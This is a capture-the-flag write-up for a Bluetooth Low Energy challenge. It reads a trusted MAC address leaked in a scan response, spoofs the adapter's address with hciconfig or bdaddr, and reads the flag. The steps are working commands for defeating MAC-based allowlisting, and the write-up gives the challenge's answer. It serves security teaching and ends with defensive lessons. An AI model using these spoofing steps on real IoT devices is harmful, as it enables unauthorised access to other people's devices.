# Writeup - Challenge 04: Identity Theft

**Difficulty:** ⭐⭐⭐ Intermediate
**Category:** Bluetooth Low Energy
**Flag:** `WOCSA{mac_auth_is_not_real_security}`

---

## 🔍 Step 1: Scan for the Device and Read the Hint

```bash
bluetoothctl
[bluetooth]# scan on
```

You will see two entries for the device (advertisement + scan response):
```
[NEW] Device AA:BB:CC:DD:EE:FF THCON26_BLE_04
[CHG] Device AA:BB:CC:DD:EE:FF Name: Trusted:DE:AD:BE:EF:CA:FE
```

The scan response contains `Trusted:DE:AD:BE:EF:CA:FE`, revealing the trusted MAC address: **`DE:AD:BE:EF:CA:FE`**.

---

## 🔗 Step 2: Attempt Connection with Your Real MAC (Fails)

```bash
gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> char-read-uuid cafebabe-0001-1000-8000-00805f9b34fb
```

Result:
```
Access Denied: Unknown device
```

The device immediately disconnects any non-trusted MAC.

---

## 🎭 Step 3: Spoof Your MAC Address

Bring the adapter down, change the MAC, bring it back up:

```bash
sudo hciconfig hci0 down
sudo hciconfig hci0 hw ether DE:AD:BE:EF:CA:FE
sudo hciconfig hci0 up
```

Verify the change:
```bash
hciconfig hci0 | grep "BD Address"
# BD Address: DE:AD:BE:EF:CA:FE
```

> **Note:** Some adapters don't support MAC spoofing via `hciconfig`. Try `bdaddr` or a USB BLE dongle instead.

```bash
# Alternative using bdaddr
sudo bdaddr -i hci0 DE:AD:BE:EF:CA:FE
sudo hciconfig hci0 reset
```

---

## 📖 Step 4: Reconnect and Read the Flag

```bash
gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> char-read-uuid cafebabe-0001-1000-8000-00805f9b34fb
```

Expected output:
```
handle: 0x0003 	 value: 57 4f 43 53 41 7b 6d 61 63 5f 61 75 74 68 5f 69 73 5f 6e 6f 74 5f 72 65 61 6c 5f 73 65 63 75 72 69 74 79 7d
```

Decode:
```
WOCSA{mac_auth_is_not_real_security}
```

---

## 🎯 Flag

```
WOCSA{mac_auth_is_not_real_security}
```

---

## Key Takeaways

* MAC addresses are **not a security mechanism** — they can be spoofed by any user with adapter control
* Many consumer IoT devices use MAC-based allowlisting as their only security layer
* The trusted MAC was leaked in the **scan response**, a publicly visible field — secrets should never be stored in advertisement data
* Proper authentication requires cryptographic mechanisms (pairing, signed payloads), not identity checks based on spoofable addresses
